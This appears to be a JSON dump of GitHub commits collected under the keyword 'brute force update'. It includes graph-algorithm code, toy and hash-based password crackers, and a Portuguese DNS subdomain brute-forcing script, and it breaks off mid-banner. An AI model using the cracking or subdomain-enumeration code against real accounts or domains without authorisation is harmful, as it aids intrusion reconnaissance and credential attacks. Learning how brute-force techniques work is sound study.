local_search(g, max_iters)\n    print(\"Local search results: \")\n    _,colors_vector = calc_solution_value(solution,g)\n    print(colors_vector)\n    print(curr_value)\n\n    #Simulated annealing algorithm\n    solution, curr_value = simulated_annealing(g, max_iters)\n    print(\"Simulated_annealing results: \")\n    _, colors_vector = calc_solution_value(solution, g)\n    print(colors_vector)\n    print(curr_value)"}},"msg":"Changed brute_force(works correctly)"}},"https:\/\/github.com\/VasilikiZarkadoula\/Mining-Complex-Networks-Auth-2023":{"ed8bea40f51c993b9e2e72ef677db3dff0a8f612":{"url":"https:\/\/api.github.com\/repos\/VasilikiZarkadoula\/Mining-Complex-Networks-Auth-2023\/commits\/ed8bea40f51c993b9e2e72ef677db3dff0a8f612","html_url":"https:\/\/github.com\/VasilikiZarkadoula\/Mining-Complex-Networks-Auth-2023\/commit\/ed8bea40f51c993b9e2e72ef677db3dff0a8f612","message":"Update brute_force.py","sha":"ed8bea40f51c993b9e2e72ef677db3dff0a8f612","keyword":"brute force update","diff":"diff --git a\/source\/brute_force.py b\/source\/brute_force.py\nindex 7428384..c3a762a 100644\n--- a\/source\/brute_force.py\n+++ b\/source\/brute_force.py\n@@ -5,7 +5,6 @@ class BruteForce:\n \r\n     def __init__(self, graph, is_directed = False):\r\n         self.graph = graph\r\n-        # self.denominator = 3 if is_directed else 6\r\n \r\n     def brute_force(self):\r\n         adj = self.graph.adj_matrix()\r\n@@ -21,10 +20,5 @@ def brute_force(self):\n                     if adj[i][j] and adj[j][k] and adj[k][i]:\r\n                         count_triangle += 1\r\n \r\n-        # If graph is directed , division is done by 3\r\n-        # else division by 6 is done\r\n-\r\n-        return count_triangle  # \/\/ self.denominator\r\n-\r\n-\r\n \r\n+        return count_triangle  \r\n","files":{"\/source\/brute_force.py":{"changes":[{"diff":"\n                     if adj[i][j] and adj[j][k] and adj[k][i]:\r\n                         count_triangle += 1\r\n \r\n-        # If graph is directed , division is done by 3\r\n-        # else division by 6 is done\r\n-\r\n-        return count_triangle  # \/\/ self.denominator\r\n-\r\n-\r\n \r\n+        return count_triangle  \r\n","add":1,"remove":6,"filename":"\/source\/brute_force.py","badparts":["\r","        return count_triangle  # \/\/ self.denominator\r","\r","\r"],"goodparts":["        return count_triangle  \r"]}],"source":"\nfrom tqdm import tqdm\r \r \r class BruteForce:\r \r def __init__(self, graph, is_directed=False):\r self.graph=graph\r \r def brute_force(self):\r adj=self.graph.adj_matrix()\r nodes=len(adj)\r count_triangle=0\r \r for i in tqdm(range(nodes)):\r for j in range(i +1, nodes):\r for k in range(j +1, nodes):\r \r if adj[i][j] and adj[j][k] and adj[k][i]:\r count_triangle +=1\r \r \r return count_triangle \r \r \r ","sourceWithComments":"from tqdm import tqdm\r\n\r\n\r\nclass BruteForce:\r\n\r\n    def __init__(self, graph, is_directed = False):\r\n        self.graph = graph\r\n        # self.denominator = 3 if is_directed else 6\r\n\r\n    def brute_force(self):\r\n        adj = self.graph.adj_matrix()\r\n        nodes = len(adj)\r\n        count_triangle = 0\r\n\r\n        for i in tqdm(range(nodes)):\r\n            for j in range(i + 1, nodes):\r\n                for k in range(j + 1, nodes):\r\n\r\n                    # check the triplet\r\n                    # if it satisfies the condition\r\n                    if adj[i][j] and adj[j][k] and adj[k][i]:\r\n                        count_triangle += 1\r\n\r\n        # If graph is directed , division is done by 3\r\n        # else division by 6 is done\r\n\r\n        return count_triangle  # \/\/ self.denominator\r\n\r\n\r\n\r\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/m-a-t-s\/brute-force":{"48a867305a7fac9ff8c0352418c96437546c7c3b":{"url":"https:\/\/api.github.com\/repos\/m-a-t-s\/brute-force\/commits\/48a867305a7fac9ff8c0352418c96437546c7c3b","html_url":"https:\/\/github.com\/m-a-t-s\/brute-force\/commit\/48a867305a7fac9ff8c0352418c96437546c7c3b","message":"Update brute-force.py\n\nAdd progress bar","sha":"48a867305a7fac9ff8c0352418c96437546c7c3b","keyword":"brute force update","diff":"diff --git a\/brute-force.py b\/brute-force.py\nindex d4b5451..a9a963b 100644\n--- a\/brute-force.py\n+++ b\/brute-force.py\n@@ -1,6 +1,7 @@\n import itertools\n import string\n import time\n+from tqdm import tqdm\n \n def brute_force(target_password, max_length):\n     start_time = time.time()  # Record the start time\n@@ -9,7 +10,7 @@ def brute_force(target_password, max_length):\n     characters = string.ascii_letters + string.digits \n \n     # Iterate through different password lengths\n-    for length in range(1, max_length + 1):\n+    for length in tqdm(range(1, max_length + 1), desc='Progress'):\n         # Iterate through all possible combinations of characters for the current password length\n         for attempt in itertools.product(characters, repeat=length):\n             attempt = ''.join(attempt)\n@@ -39,3 +40,4 @@ def main():\n \n if __name__ == \"__main__\":\n     main()\n+\n","files":{"\/brute-force.py":{"changes":[{"diff":"\n     characters = string.ascii_letters + string.digits \n \n     # Iterate through different password lengths\n-    for length in range(1, max_length + 1):\n+    for length in tqdm(range(1, max_length + 1), desc='Progress'):\n         # Iterate through all possible combinations of characters for the current password length\n         for attempt in itertools.product(characters, repeat=length):\n             attempt = ''.join(attempt)\n","add":1,"remove":1,"filename":"\/brute-force.py","badparts":["    for length in range(1, max_length + 1):"],"goodparts":["    for length in tqdm(range(1, max_length + 1), desc='Progress'):"]}],"source":"\nimport itertools import string import time def brute_force(target_password, max_length): start_time=time.time() characters=string.ascii_letters +string.digits for length in range(1, max_length +1): for attempt in itertools.product(characters, repeat=length): attempt=''.join(attempt) if attempt==target_password: end_time=time.time() duration=end_time -start_time return attempt, duration return None, None def main(): print(\"Brute-force password guesser for educational purposes only.\") print(\"Enter the target password and the maximum length to guess(up to 6 for reasonable runtimes).\") target_password=input(\"Enter the target password: \") max_length=int(input(\"Enter the maximum length: \")) guessed_password, duration=brute_force(target_password, max_length) if guessed_password: print(f\"Password found:{guessed_password}\") print(f\"Time taken:{duration:.2f} seconds\") else: print(\"Password not found\") if __name__==\"__main__\": main() ","sourceWithComments":"import itertools\nimport string\nimport time\n\ndef brute_force(target_password, max_length):\n    start_time = time.time()  # Record the start time\n\n    # Define the character set for the password guess attempts\n    characters = string.ascii_letters + string.digits \n\n    # Iterate through different password lengths\n    for length in range(1, max_length + 1):\n        # Iterate through all possible combinations of characters for the current password length\n        for attempt in itertools.product(characters, repeat=length):\n            attempt = ''.join(attempt)\n            if attempt == target_password:\n                end_time = time.time()  # Record the end time\n                duration = end_time - start_time  # Calculate the duration\n                return attempt, duration\n\n    return None, None\n\ndef main():\n    print(\"Brute-force password guesser for educational purposes only.\")\n    print(\"Enter the target password and the maximum length to guess (up to 6 for reasonable runtimes).\")\n\n    # Get the target password from the user\n    target_password = input(\"Enter the target password: \")\n    # Get the maximum length from the user \n    max_length = int(input(\"Enter the maximum length: \")) \n\n    guessed_password, duration = brute_force(target_password, max_length)\n\n    if guessed_password:\n        print(f\"Password found: {guessed_password}\")\n        print(f\"Time taken: {duration:.2f} seconds\")\n    else:\n        print(\"Password not found\")\n\nif __name__ == \"__main__\":\n    main()\n"}},"msg":"Update brute-force.py\n\nAdd progress bar"}},"https:\/\/github.com\/muthoninduhiu\/pythonMOOCChallenge":{"ad5d6a6d3e3ed196126e29697f735b8f3b8e8903":{"url":"https:\/\/api.github.com\/repos\/muthoninduhiu\/pythonMOOCChallenge\/commits\/ad5d6a6d3e3ed196126e29697f735b8f3b8e8903","html_url":"https:\/\/github.com\/muthoninduhiu\/pythonMOOCChallenge\/commit\/ad5d6a6d3e3ed196126e29697f735b8f3b8e8903","message":"update brute force cracker","sha":"ad5d6a6d3e3ed196126e29697f735b8f3b8e8903","keyword":"brute force update","diff":"diff --git a\/brute_force_crack.py b\/brute_force_crack.py\nindex 2a0eef3..ad70291 100644\n--- a\/brute_force_crack.py\n+++ b\/brute_force_crack.py\n@@ -4,7 +4,6 @@\n import string\n import time\n \n-\n # create the main window of the app\n root = tk.Tk()\n # set the title of the main window as 'Brute Force'\n@@ -12,6 +11,10 @@\n root.geometry(\"600x600\")\n root.config(background=\"#000000\")\n \n+# read the password file and store the passwords in memory\n+with open('password.txt', 'r', encoding='utf-8') as text_file:\n+    password_list = [line.strip() for line in text_file]\n+\n \n # functions\n \n@@ -30,73 +33,54 @@ def get_hash(password):\n     return result.hexdigest()\n \n \n-def brute_force(password_list, hashed_password, password, try_random_password):\n-    \"\"\"\n-        A function used return the password as a string of double length\n-        param: password: user input,\n-               password_hash: hashed password,\n-               password_list: common passwords list,\n-               try_random_password: variable used when userinput is not in  password_list\n-        return: no return value\n+    def brute_force(password_list, hashed_password, password):\n         \"\"\"\n-    found_password = False\n-    # check if password is in password list\n-    for guess_password in password_list:\n-        if get_hash(guess_password) == hashed_password:\n-            correct_password = guess_password\n-            result_label.grid_forget()\n-            result_label.config(text=\"Your password:\\n\" + correct_password\n-                               + \"\\n is a common password\")\n-            found_password = 1\n-            break\n-    # else try cracking the password using brute force(guessing)\n-\n-    if try_random_password == 0 and not found_password:\n+            A function used return the password as a string of double length\n+            param: password: user input,\n+                   password_hash: hashed password,\n+                   password_list: common passwords list,\n+                   try_random_password: variable used when userinput is not in  password_list\n+            return: no return value\n+            \"\"\"\n         charset = string.ascii_letters + string.digits + string.punctuation\n-\n         # cartesian product, equivalent to a nested for-loop\n         # a set of all ordered pairs between charset and repeat\n         # which is the length of the password input\n-        for pwd in itertools.product(charset, repeat=len(password)):\n-            # add the values without space to the test variable\n-            test = ''.join(pwd)\n-            print(\"Trying %s...\" % test)\n-            if test == password:\n-                result_label.grid_forget()\n-                result_label.config(text=\"Your password:\\n\" + test\n-                                   + \"\\n was cracked!\")\n-                found_password = 1\n-                break\n-    # error message if password is not found\n-    if not found_password:\n-        result_label.config(text=\"password not found\")\n-\n-\n-def check_password():\n-    \"\"\"\n-    A function used to call the functions get_hash()and brute_force\n-    so that we can perform the cracking\n-    params: none\n-    return value: none\n-    \"\"\"\n-    user_input = enter_text.get()\n-    with open('password.txt', 'r', encoding='utf-8') as text_file:\n-        contents = text_file.read()\n+        for pwd in map(''.join, itertools.product(charset, repeat=len(password))):\n+            if get_hash(pwd) == hashed_password:\n+                result_label.configure(text=\"Your password:\\n\" + pwd + \"\\n was cracked!\")\n+                return True\n \n-    st = time.time()\n-    hashed_password = get_hash(user_input)\n-    password_list = contents.split('\\n')\n-    try_random_password = 0\n-    # Running the Brute Force attack\n-    brute_force(password_list, hashed_password, user_input, try_random_password)\n+        return False\n \n-    # get the end time\n-    et = time.time()\n \n-    # get the execution time\n-    res = et - st\n-    time_used.config(\n-        text=\"Execution time: \\n\" + str(round(res, 4)) + 'seconds')\n+    def check_password():\n+        \"\"\"\n+        A function used to call the functions get_hash()and brute_force\n+        so that we can perform the cracking\n+        params: none\n+        return value: none\n+        \"\"\"\n+        user_input = enter_text.get()\n+        st = time.time()\n+        hashed_password = get_hash(user_input)\n+\n+        if hashed_password in password_list:\n+            correct_password = password_list.index(hashed_password)\n+            result_label.configure(text=\"Your password:\\n\" + password_list[correct_password] + \"\\n is a common password\")\n+        else:\n+            if brute_force(password_list, hashed_password, user_input):\n+                result_label.configure(text=\"Password cracked!\")\n+            else:\n+                result_label.configure(text=\"Password not found\")\n+\n+        # get the end time\n+        et = time.time()\n+\n+        # get the execution time\n+        res = et - st\n+        time_used.config(\n+            text=\"Execution time: \\n\" + str(round(res, 4)) + 'seconds')\n \n \n # style the heading\n@@ -129,10 +113,10 @@ def check_password():\n result_label.place(x=0, y=250)\n \n time_used = tk.Label(\n-        root,\n-        font=(\"Verdana\", 20, \"bold\"),\n-        bg=\"#000000\",\n-        fg=\"#1e00ff\")\n+    root,\n+    font=(\"Verdana\", 20, \"bold\"),\n+    bg=\"#000000\",\n+    fg=\"#1e00ff\")\n time_used.place(x=170, y=400)\n \n # style the button\ndiff --git a\/new.py b\/new.py\nnew file mode 100644\nindex 0000000..946c36b\n--- \/dev\/null\n+++ b\/new.py\n@@ -0,0 +1,123 @@\n+import tkinter as tk\n+import hashlib\n+import threading\n+import time\n+\n+# read the password list file\n+with open('password.txt', 'r', encoding='utf-8') as text_file:\n+    password_list = text_file.read().splitlines()\n+\n+# create a dictionary of common passwords and their hashes\n+password_dict = {}\n+for password in password_list:\n+    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n+    password_dict[hashed_password] = password\n+\n+# create the main window of the app\n+root = tk.Tk()\n+# set the title of the main window as 'Brute Force'\n+root.title(\"Brute Force\")\n+root.geometry(\"600x600\")\n+root.config(background=\"#000000\")\n+\n+\n+# functions\n+\n+# function to add a hint of input for user experience\n+def temp_text(e):\n+    enter_text.delete(0, \"end\")\n+\n+\n+def brute_force(hashed_password):\n+    \"\"\"\n+    A function used to crack the password hash using a dictionary-based approach\n+    param: hashed_password: the hash of the password to be cracked\n+    return: the cracked password if found, otherwise None\n+    \"\"\"\n+    if hashed_password in password_dict:\n+        return password_dict[hashed_password]\n+    else:\n+        return None\n+\n+\n+def check_password():\n+    \"\"\"\n+    A function used to call the functions get_hash()and brute_force\n+    so that we can perform the cracking\n+    params: none\n+    return value: none\n+    \"\"\"\n+    user_input = enter_text.get()\n+\n+    st = time.time()\n+    hash_password = hashlib.sha256(user_input.encode()).hexdigest()\n+\n+    # use multi-threading to run the brute-force attack\n+    def run_brute_force():\n+        found_password = brute_force(hash_password)\n+        if found_password is not None:\n+            result_label.config(text=\"Your password:\\n\" + found_password\n+                                     + \"\\n is a common password\")\n+        else:\n+            result_label.config(text=\"password not found\")\n+\n+    t = threading.Thread(target=run_brute_force)\n+    t.start()\n+\n+    # get the end time\n+    et = time.time()\n+\n+    # get the execution time\n+    res = et - st\n+    time_used.config(\n+        text=\"Execution time: \\n\" + str(round(res, 4)) + ' seconds')\n+\n+# style the heading\n+heading = tk.Label(\n+    root,\n+    text=\"Password Cracker\",\n+    font=(\"Verdana\", 23, \"bold\"),\n+    bg=\"#000000\",\n+    fg=\"#1e00ff\")\n+heading.pack(pady=(90, 0))\n+\n+# style the entry box\n+enter_text = tk.Entry(\n+    root,\n+    justify=\"center\",\n+    width=15,\n+    font=(\"Verdana\", 15, \"italic\"),\n+    bg=\"white\",\n+    border=2)\n+enter_text.insert(0, \"Enter Password...\")\n+enter_text.pack(pady=10)\n+enter_text.bind(\"<FocusIn>\", temp_text)\n+\n+result_label = tk.Label(\n+    root,\n+    width=30,\n+    font=(\"Verdana\", 20, \"bold\"),\n+    bg=\"#000000\",\n+    fg=\"#1e00ff\")\n+result_label.place(x=0, y=250)\n+\n+time_used = tk.Label(\n+        root,\n+        font=(\"Verdana\", 20, \"bold\"),\n+        bg=\"#000000\",\n+        fg=\"#1e00ff\")\n+time_used.place(x=170, y=400)\n+\n+# style the button\n+button = tk.Button(\n+    root,\n+    text=\"Check Password\",\n+    width=17,\n+    font=(\"Verdana\", 20, \"bold\"),\n+    fg=\"#1e00ff\",\n+    bg=\"#000000\",\n+    command=check_password)\n+button.pack()\n+\n+# end the loop\n+root.mainloop()\n","files":{"\/brute_force_crack.py":{"changes":[{"diff":"\n     return result.hexdigest()\n \n \n-def brute_force(password_list, hashed_password, password, try_random_password):\n-    \"\"\"\n-        A function used return the password as a string of double length\n-        param: password: user input,\n-               password_hash: hashed password,\n-               password_list: common passwords list,\n-               try_random_password: variable used when userinput is not in  password_list\n-        return: no return value\n+    def brute_force(password_list, hashed_password, password):\n         \"\"\"\n-    found_password = False\n-    # check if password is in password list\n-    for guess_password in password_list:\n-        if get_hash(guess_password) == hashed_password:\n-            correct_password = guess_password\n-            result_label.grid_forget()\n-            result_label.config(text=\"Your password:\\n\" + correct_password\n-                               + \"\\n is a common password\")\n-            found_password = 1\n-            break\n-    # else try cracking the password using brute force(guessing)\n-\n-    if try_random_password == 0 and not found_password:\n+            A function used return the password as a string of double length\n+            param: password: user input,\n+                   password_hash: hashed password,\n+                   password_list: common passwords list,\n+                   try_random_password: variable used when userinput is not in  password_list\n+            return: no return value\n+            \"\"\"\n         charset = string.ascii_letters + string.digits + string.punctuation\n-\n         # cartesian product, equivalent to a nested for-loop\n         # a set of all ordered pairs between charset and repeat\n         # which is the length of the password input\n-        for pwd in itertools.product(charset, repeat=len(password)):\n-            # add the values without space to the test variable\n-            test = ''.join(pwd)\n-            print(\"Trying %s...\" % test)\n-            if test == password:\n-                result_label.grid_forget()\n-                result_label.config(text=\"Your password:\\n\" + test\n-                                   + \"\\n was cracked!\")\n-                found_password = 1\n-                break\n-    # error message if password is not found\n-    if not found_password:\n-        result_label.config(text=\"password not found\")\n-\n-\n-def check_password():\n-    \"\"\"\n-    A function used to call the functions get_hash()and brute_force\n-    so that we can perform the cracking\n-    params: none\n-    return value: none\n-    \"\"\"\n-    user_input = enter_text.get()\n-    with open('password.txt', 'r', encoding='utf-8') as text_file:\n-        contents = text_file.read()\n+        for pwd in map(''.join, itertools.product(charset, repeat=len(password))):\n+            if get_hash(pwd) == hashed_password:\n+                result_label.configure(text=\"Your password:\\n\" + pwd + \"\\n was cracked!\")\n+                return True\n \n-    st = time.time()\n-    hashed_password = get_hash(user_input)\n-    password_list = contents.split('\\n')\n-    try_random_password = 0\n-    # Running the Brute Force attack\n-    brute_force(password_list, hashed_password, user_input, try_random_password)\n+        return False\n \n-    # get the end time\n-    et = time.time()\n \n-    # get the execution time\n-    res = et - st\n-    time_used.config(\n-        text=\"Execution time: \\n\" + str(round(res, 4)) + 'seconds')\n+    def check_password():\n+        \"\"\"\n+        A function used to call the functions get_hash()and brute_force\n+        so that we can perform the cracking\n+        params: none\n+        return value: none\n+        \"\"\"\n+        user_input = enter_text.get()\n+        st = time.time()\n+        hashed_password = get_hash(user_input)\n+\n+        if hashed_password in password_list:\n+            correct_password = password_list.index(hashed_password)\n+            result_label.configure(text=\"Your password:\\n\" + password_list[correct_password] + \"\\n is a common password\")\n+        else:\n+            if brute_force(password_list, hashed_password, user_input):\n+                result_label.configure(text=\"Password cracked!\")\n+            else:\n+                result_label.configure(text=\"Password not found\")\n+\n+        # get the end time\n+        et = time.time()\n+\n+        # get the execution time\n+        res = et - st\n+        time_used.config(\n+            text=\"Execution time: \\n\" + str(round(res, 4)) + 'seconds')\n \n \n # style the heading\n","add":40,"remove":59,"filename":"\/brute_force_crack.py","badparts":["def brute_force(password_list, hashed_password, password, try_random_password):","    \"\"\"","        A function used return the password as a string of double length","        param: password: user input,","               password_hash: hashed password,","               password_list: common passwords list,","               try_random_password: variable used when userinput is not in  password_list","        return: no return value","    found_password = False","    for guess_password in password_list:","        if get_hash(guess_password) == hashed_password:","            correct_password = guess_password","            result_label.grid_forget()","            result_label.config(text=\"Your password:\\n\" + correct_password","                               + \"\\n is a common password\")","            found_password = 1","            break","    if try_random_password == 0 and not found_password:","        for pwd in itertools.product(charset, repeat=len(password)):","            test = ''.join(pwd)","            print(\"Trying %s...\" % test)","            if test == password:","                result_label.grid_forget()","                result_label.config(text=\"Your password:\\n\" + test","                                   + \"\\n was cracked!\")","                found_password = 1","                break","    if not found_password:","        result_label.config(text=\"password not found\")","def check_password():","    \"\"\"","    A function used to call the functions get_hash()and brute_force","    so that we can perform the cracking","    params: none","    return value: none","    \"\"\"","    user_input = enter_text.get()","    with open('password.txt', 'r', encoding='utf-8') as text_file:","        contents = text_file.read()","    st = time.time()","    hashed_password = get_hash(user_input)","    password_list = contents.split('\\n')","    try_random_password = 0","    brute_force(password_list, hashed_password, user_input, try_random_password)","    et = time.time()","    res = et - st","    time_used.config(","        text=\"Execution time: \\n\" + str(round(res, 4)) + 'seconds')"],"goodparts":["    def brute_force(password_list, hashed_password, password):","            A function used return the password as a string of double length","            param: password: user input,","                   password_hash: hashed password,","                   password_list: common passwords list,","                   try_random_password: variable used when userinput is not in  password_list","            return: no return value","            \"\"\"","        for pwd in map(''.join, itertools.product(charset, repeat=len(password))):","            if get_hash(pwd) == hashed_password:","                result_label.configure(text=\"Your password:\\n\" + pwd + \"\\n was cracked!\")","                return True","        return False","    def check_password():","        \"\"\"","        A function used to call the functions get_hash()and brute_force","        so that we can perform the cracking","        params: none","        return value: none","        \"\"\"","        user_input = enter_text.get()","        st = time.time()","        hashed_password = get_hash(user_input)","        if hashed_password in password_list:","            correct_password = password_list.index(hashed_password)","            result_label.configure(text=\"Your password:\\n\" + password_list[correct_password] + \"\\n is a common password\")","        else:","            if brute_force(password_list, hashed_password, user_input):","                result_label.configure(text=\"Password cracked!\")","            else:","                result_label.configure(text=\"Password not found\")","        et = time.time()","        res = et - st","        time_used.config(","            text=\"Execution time: \\n\" + str(round(res, 4)) + 'seconds')"]},{"diff":"\n result_label.place(x=0, y=250)\n \n time_used = tk.Label(\n-        root,\n-        font=(\"Verdana\", 20, \"bold\"),\n-        bg=\"#000000\",\n-        fg=\"#1e00ff\")\n+    root,\n+    font=(\"Verdana\", 20, \"bold\"),\n+    bg=\"#000000\",\n+    fg=\"#1e00ff\")\n time_used.place(x=170, y=400)\n \n # style the button","add":4,"remove":4,"filename":"\/brute_force_crack.py","badparts":["        root,","        font=(\"Verdana\", 20, \"bold\"),","        bg=\"#000000\",","        fg=\"#1e00ff\")"],"goodparts":["    root,","    font=(\"Verdana\", 20, \"bold\"),","    bg=\"#000000\",","    fg=\"#1e00ff\")"]}],"source":"\nimport tkinter as tk import hashlib import itertools import string import time root=tk.Tk() root.title(\"Brute Force\") root.geometry(\"600x600\") root.config(background=\" def temp_text(e): enter_text.delete(0, \"end\") def get_hash(password): \"\"\" A function used return the password as a string of double length param: password return: password that has been hashed \"\"\" result=hashlib.sha1(password.encode()) return result.hexdigest() def brute_force(password_list, hashed_password, password, try_random_password): \"\"\" A function used return the password as a string of double length param: password: user input, password_hash: hashed password, password_list: common passwords list, try_random_password: variable used when userinput is not in password_list return: no return value \"\"\" found_password=False for guess_password in password_list: if get_hash(guess_password)==hashed_password: correct_password=guess_password result_label.grid_forget() result_label.config(text=\"Your password:\\n\" +correct_password +\"\\n is a common password\") found_password=1 break if try_random_password==0 and not found_password: charset=string.ascii_letters +string.digits +string.punctuation for pwd in itertools.product(charset, repeat=len(password)): test=''.join(pwd) print(\"Trying %s...\" % test) if test==password: result_label.grid_forget() result_label.config(text=\"Your password:\\n\" +test +\"\\n was cracked!\") found_password=1 break if not found_password: result_label.config(text=\"password not found\") def check_password(): \"\"\" A function used to call the functions get_hash()and brute_force so that we can perform the cracking params: none return value: none \"\"\" user_input=enter_text.get() with open('password.txt', 'r', encoding='utf-8') as text_file: contents=text_file.read() st=time.time() hashed_password=get_hash(user_input) password_list=contents.split('\\n') try_random_password=0 brute_force(password_list, hashed_password, user_input, try_random_password) et=time.time() res=et -st time_used.config( text=\"Execution time: \\n\" +str(round(res, 4)) +'seconds') heading=tk.Label( root, text=\"Password Cracker\", font=(\"Verdana\", 23, \"bold\"), bg=\" fg=\" heading.pack(pady=(90, 0)) enter_text=tk.Entry( root, justify=\"center\", width=15, font=(\"Verdana\", 15, \"italic\"), bg=\"white\", border=2) enter_text.insert(0, \"Enter Password...\") enter_text.pack(pady=10) enter_text.bind(\"<FocusIn>\", temp_text) result_label=tk.Label( root, width=30, font=(\"Verdana\", 20, \"bold\"), bg=\" fg=\" result_label.place(x=0, y=250) time_used=tk.Label( root, font=(\"Verdana\", 20, \"bold\"), bg=\" fg=\" time_used.place(x=170, y=400) button=tk.Button( root, text=\"Check Password\", width=17, font=(\"Verdana\", 20, \"bold\"), fg=\" bg=\" command=check_password) button.pack() root.mainloop() ","sourceWithComments":"import tkinter as tk\nimport hashlib\nimport itertools\nimport string\nimport time\n\n\n# create the main window of the app\nroot = tk.Tk()\n# set the title of the main window as 'Brute Force'\nroot.title(\"Brute Force\")\nroot.geometry(\"600x600\")\nroot.config(background=\"#000000\")\n\n\n# functions\n\n# function to add a hint of input for user experience\ndef temp_text(e):\n    enter_text.delete(0, \"end\")\n\n\ndef get_hash(password):\n    \"\"\"\n    A function used return the password as a string of double length\n    param: password\n    return: password that has been hashed\n    \"\"\"\n    result = hashlib.sha1(password.encode())\n    return result.hexdigest()\n\n\ndef brute_force(password_list, hashed_password, password, try_random_password):\n    \"\"\"\n        A function used return the password as a string of double length\n        param: password: user input,\n               password_hash: hashed password,\n               password_list: common passwords list,\n               try_random_password: variable used when userinput is not in  password_list\n        return: no return value\n        \"\"\"\n    found_password = False\n    # check if password is in password list\n    for guess_password in password_list:\n        if get_hash(guess_password) == hashed_password:\n            correct_password = guess_password\n            result_label.grid_forget()\n            result_label.config(text=\"Your password:\\n\" + correct_password\n                               + \"\\n is a common password\")\n            found_password = 1\n            break\n    # else try cracking the password using brute force(guessing)\n\n    if try_random_password == 0 and not found_password:\n        charset = string.ascii_letters + string.digits + string.punctuation\n\n        # cartesian product, equivalent to a nested for-loop\n        # a set of all ordered pairs between charset and repeat\n        # which is the length of the password input\n        for pwd in itertools.product(charset, repeat=len(password)):\n            # add the values without space to the test variable\n            test = ''.join(pwd)\n            print(\"Trying %s...\" % test)\n            if test == password:\n                result_label.grid_forget()\n                result_label.config(text=\"Your password:\\n\" + test\n                                   + \"\\n was cracked!\")\n                found_password = 1\n                break\n    # error message if password is not found\n    if not found_password:\n        result_label.config(text=\"password not found\")\n\n\ndef check_password():\n    \"\"\"\n    A function used to call the functions get_hash()and brute_force\n    so that we can perform the cracking\n    params: none\n    return value: none\n    \"\"\"\n    user_input = enter_text.get()\n    with open('password.txt', 'r', encoding='utf-8') as text_file:\n        contents = text_file.read()\n\n    st = time.time()\n    hashed_password = get_hash(user_input)\n    password_list = contents.split('\\n')\n    try_random_password = 0\n    # Running the Brute Force attack\n    brute_force(password_list, hashed_password, user_input, try_random_password)\n\n    # get the end time\n    et = time.time()\n\n    # get the execution time\n    res = et - st\n    time_used.config(\n        text=\"Execution time: \\n\" + str(round(res, 4)) + 'seconds')\n\n\n# style the heading\nheading = tk.Label(\n    root,\n    text=\"Password Cracker\",\n    font=(\"Verdana\", 23, \"bold\"),\n    bg=\"#000000\",\n    fg=\"#1e00ff\")\nheading.pack(pady=(90, 0))\n\n# style the entry box\nenter_text = tk.Entry(\n    root,\n    justify=\"center\",\n    width=15,\n    font=(\"Verdana\", 15, \"italic\"),\n    bg=\"white\",\n    border=2)\nenter_text.insert(0, \"Enter Password...\")\nenter_text.pack(pady=10)\nenter_text.bind(\"<FocusIn>\", temp_text)\n\nresult_label = tk.Label(\n    root,\n    width=30,\n    font=(\"Verdana\", 20, \"bold\"),\n    bg=\"#000000\",\n    fg=\"#1e00ff\")\nresult_label.place(x=0, y=250)\n\ntime_used = tk.Label(\n        root,\n        font=(\"Verdana\", 20, \"bold\"),\n        bg=\"#000000\",\n        fg=\"#1e00ff\")\ntime_used.place(x=170, y=400)\n\n# style the button\nbutton = tk.Button(\n    root,\n    text=\"Check Password\",\n    width=17,\n    font=(\"Verdana\", 20, \"bold\"),\n    fg=\"#1e00ff\",\n    bg=\"#000000\",\n    command=check_password)\nbutton.pack()\n\n# end the loop\nroot.mainloop()\n"}},"msg":"update brute force cracker"}},"https:\/\/github.com\/Berg777\/Brute-Force-Tools":{"8f9f5a0d241d7b6c50c5e4912f5d0e5645697668":{"url":"https:\/\/api.github.com\/repos\/Berg777\/Brute-Force-Tools\/commits\/8f9f5a0d241d7b6c50c5e4912f5d0e5645697668","html_url":"https:\/\/github.com\/Berg777\/Brute-Force-Tools\/commit\/8f9f5a0d241d7b6c50c5e4912f5d0e5645697668","message":"Update DNS_Brute_Force.py","sha":"8f9f5a0d241d7b6c50c5e4912f5d0e5645697668","keyword":"brute force update","diff":"diff --git a\/DNS_Brute_Force.py b\/DNS_Brute_Force.py\nindex 3d614e3..f3bcd38 100644\n--- a\/DNS_Brute_Force.py\n+++ b\/DNS_Brute_Force.py\n@@ -19,8 +19,9 @@\n caminho = input(fade.fire(\"Digite o caminho da wordlist desejada para o ataque: \"))\n arquivo = open(caminho)\n subdominios = arquivo.read().splitlines()\n+count  = 0\n \n-alvo = input(fade.fire(\"Digite o alvo desejado [URL]: \"))\n+alvo = input(fade.fire(\"Digite o alvo desejado: \"))\n \n for sub in subdominios:\n \n@@ -32,6 +33,9 @@\n         for ip in resultado:\n \n             print(fade.fire(f\"{sub_alvo.strip():-<50}->  {ip}\"))\n+            count += 1\n \n     except:\n         pass\n+\n+print(fade.fire(f\"No total foram encontrados {count} subdom\u00ednios para {alvo}\"))\n","files":{"\/DNS_Brute_Force.py":{"changes":[{"diff":"\n caminho = input(fade.fire(\"Digite o caminho da wordlist desejada para o ataque: \"))\n arquivo = open(caminho)\n subdominios = arquivo.read().splitlines()\n+count  = 0\n \n-alvo = input(fade.fire(\"Digite o alvo desejado [URL]: \"))\n+alvo = input(fade.fire(\"Digite o alvo desejado: \"))\n \n for sub in subdominios:\n \n","add":2,"remove":1,"filename":"\/DNS_Brute_Force.py","badparts":["alvo = input(fade.fire(\"Digite o alvo desejado [URL]: \"))"],"goodparts":["count  = 0","alvo = input(fade.fire(\"Digite o alvo desejado: \"))"]}],"source":"\n import dns.resolver import fade print(fade.fire(\"\"\"\u2593\u2588\u2588\u2588\u2588\u2588\u2584 \u2588\u2588\u2588\u2584 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588 \u2584\u2584\u2584\u2584 \u2588\u2588\u2580\u2588\u2588\u2588 \u2588 \u2588\u2588 \u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2593\u2593\u2588\u2588\u2588\u2588\u2588 \u2592\u2588\u2588\u2580 \u2588\u2588\u258c \u2588\u2588 \u2580\u2588 \u2588 \u2592\u2588\u2588 \u2592 \u2593\u2588\u2588\u2588\u2588\u2588\u2584 \u2593\u2588\u2588 \u2592 \u2588\u2588\u2592 \u2588\u2588 \u2593\u2588\u2588\u2592\u2593 \u2588\u2588\u2592 \u2593\u2592\u2593\u2588 \u2580 \u2591\u2588\u2588 \u2588\u258c\u2593\u2588\u2588 \u2580\u2588 \u2588\u2588\u2592\u2591 